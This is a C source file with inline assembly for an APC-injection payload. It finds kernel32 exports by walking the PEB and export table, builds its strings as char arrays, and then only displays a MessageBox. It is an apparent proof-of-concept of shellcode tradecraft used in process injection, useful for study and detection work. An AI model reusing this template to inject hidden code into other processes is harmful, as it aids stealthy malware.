/*  -----------------------------------------------------------------------
                            APC Injection payload                
    -----------------------------------------------------------------------*/

#include <windows.h>
#include "header.h"

void __stdcall Papcfunc(PVOID p1, PVOID p2, PVOID p3){

    #define noebp_origebp               0x00

    char title[] = {'T','i','t','l','e',0};
    char msg[] = {'M','e','s','s','a','g','e',0};
    char __User32_dll[] = {'U','s','e','r','3','2','.','d','l','l',0};

    char __MessageBox[] = {'M','e','s','s','a','g','e','B','o','x','A',0};
    char __LoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char __GetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};

    HMODULE (__stdcall *LoadLibraryA)       (char*)                         ;
    void*   (__stdcall *GetProcAddress)     (void*, char*)                  ;
    int     (__stdcall *MessageBox)         (HWND, LPCTSTR, LPCTSTR, UINT)  ;


    
    __asm{
        jmp main
    }

    __asm {
        //-------------------------------------------------------------------------------------------------------
        // getprocaddr(): An inline implementation of kernel32.dll GetProcAddress() function. getprocaddr() lookup
        //      a function in kernel32's EAT. The search is done by name, and the entry point of the requested 
        //      function is returned. If function not found, function returns -1.
        //
        // Arguments (fastcall): ecx (char*) : a pointer to the requested function name
        //
        // Return Value: Function address. If function not found, -1 is returned.
        //-------------------------------------------------------------------------------------------------------
        getprocaddr:                                    // function label
            push    ebp                                 // create a stack frame
            mov     ebp, esp                            //
            sub     esp, 0x20                           // 32 bytes seem enough
            push    ebx                                 // backup registers
            push    edx                                 //
            push    esi                                 //
            push    edi                                 //
                                                        //
            mov     [ebp-4], ecx                        // loc4 = arg1
            // --------------------------------------------------------------------------
            // find length of user's function name
            // --------------------------------------------------------------------------
            xor     eax, eax                            // set al to NULL
            mov     edi, ecx                            // edi must contain the string address
            xor     ecx, ecx                            //
            not     ecx                                 // set ecx to -1
            cld                                         // clear Direction Flag (++ mode)
            repne scasb                                 // iterate over string until you find NULL
            neg     ecx                                 // toggle, and ecx will contain strlen+2 (+2 is needed)
                                                        //
            mov     [ebp-8], ecx                        // loc8 = strlen(arg1)
            // --------------------------------------------------------------------------
            // locate base address of kernel32.dll (generic - without InInitializationOrderModuleList)
            // --------------------------------------------------------------------------
            mov     eax, fs:[0x30]                      // get PEB
            mov     eax, [eax + 0x0c]                   // PEB->Ldr (PEB_LDR_DATA)
            mov     eax, [eax + 0x14]                   // PEB->Ldr.InMemoryOrderModuleList.Flink
            mov     eax, [eax]                          // skip 1st entry (module itsel)
            mov     eax, [eax]                          // skip 2nd entry (ntdll.dll)
            mov     ebx, [eax + 0x10]                   // kernel32 module base address in ebx
            // mov      [ebp - 1c], ebx                 // base address in stack
            // --------------------------------------------------------------------------
            // locate important parts of kernel32's EAT
            // --------------------------------------------------------------------------
            mov     ecx, [ebx + 0x3c]                   // ebx->e_lfanew: skip MSDOS header of kernel32.dll 
            mov     edx, [ebx + ecx + 78h]              // get export table RVA (it's 0x78 bytes after PE header)
            add     edx, ebx                            // convert it to absolute address (edx = EAT)
                                                        //
            mov     ecx, [edx + 0x18]                   // get number of exported functions
            mov     esi, [edx + 0x1c]                   // & of AddressOfNamess table
            mov     edi, [edx + 0x24]                   // & of AddressOfNameOrdinals table
            mov     edx, [edx + 0x20]                   // & of AddressOfFunctions table
            add     edx, ebx                            // convert it to absolute address
                                                        //
            mov     [ebp - 0xc], esi                    // locc  = &AddressOfNames
            mov     [ebp - 0x10], edi                   // loc10 = &AddressOfNameOrdinals
            // --------------------------------------------------------------------------
            // iterate over EAT until you find the requested function
            // --------------------------------------------------------------------------
        get_next_funnam:                                //
            jecxz   search_failed                       // reach the end of table?
            dec     ecx                                 // decrease counter
            mov     esi, [edx + ecx*4]                  // get function's name RVA
            add     esi, ebx                            // convert it to absolute address
            // --------------------------------------------------------------------------
            // compare the 2 strings
            // --------------------------------------------------------------------------
            push    ecx                                 // back up ecx
            xor     eax, eax                            // clear eax
            mov     edi, [ebp - 4]                      // edi = arg1
            mov     ecx, [ebp - 8]                      // ecx = strlen(arg1)
            dec     esi                                 // 
            dec     edi                                 // decrease, because we'll increase later
        strcmp_loop:                                    //
            inc     esi                                 // funnam++
            inc     edi                                 // arg1++
                                                        //
            mov     al, byte ptr [esi]                  // 
            cmp     al, byte ptr [edi]                  // *funnam == *arg1 ?
            loope   strcmp_loop                         // if yes get next character
                                                        //
            test    ecx, ecx                            // reach NULL ? (we need to compare also the NULL bytes)
            pop     ecx                                 // restore old ecx
            jne     get_next_funnam                     // if match not found, get next funnam from EAT
            // --------------------------------------------------------------------------
            // if you reach this point, match found
            // --------------------------------------------------------------------------
            mov     edx, [ebp-0x10]                     // &AddressOfNameOrdinals
            add     edx, ebx                            // convert it to absolute address
            shl     ecx, 1                              // counter *= 2 (because ordinals are 2 bytes)
            add     edx, ecx                            //
            movzx   ecx, word ptr[edx]                  // ecx = AddressOfNameOrdinals[counter << 1]
                                                        // ecx has the right ordinal
            mov     esi, [ebp-0xc]                      // &AddressOfNames
            add     esi, ebx                            // convert it to absolute address
            shl     ecx, 2                              // because addresses are 4 bytes
            add     esi, ecx                            // get the right slot
            mov     eax, [esi]                          // AddressOfNames[ AddressOfNameOrdinals[counter*2]*4 ]
            add     eax, ebx                            // convert from RVA to absolute address
            jmp     getprocaddr_end                     // return
            // --------------------------------------------------------------------------
            // finalize
            // --------------------------------------------------------------------------
        search_failed:                                  //
            mov     eax, 0xffffffff                     // return -1
        getprocaddr_end:                                //
            pop     edi                                 // restore registers
            pop     esi                                 //
            pop     edx                                 //
            pop     ebx                                 //
            add     esp, 0x20                           // release stack space
            leave                                       // function epilog
            retn                                        //
    }

    __asm{
        main:
            lea     ecx, [__LoadLibraryA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[LoadLibraryA], eax        // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort

            lea     ecx, [__GetProcAddress]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[GetProcAddress], eax        // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
    }

    HMODULE module = LoadLibraryA(__User32_dll);
    MessageBox = (int (__stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT)) GetProcAddress(module, __MessageBox);
    MessageBox(NULL, msg, title, 0x00000000L);

    __asm{
            nop
        exit_fn:
            nop
    }
    return;

}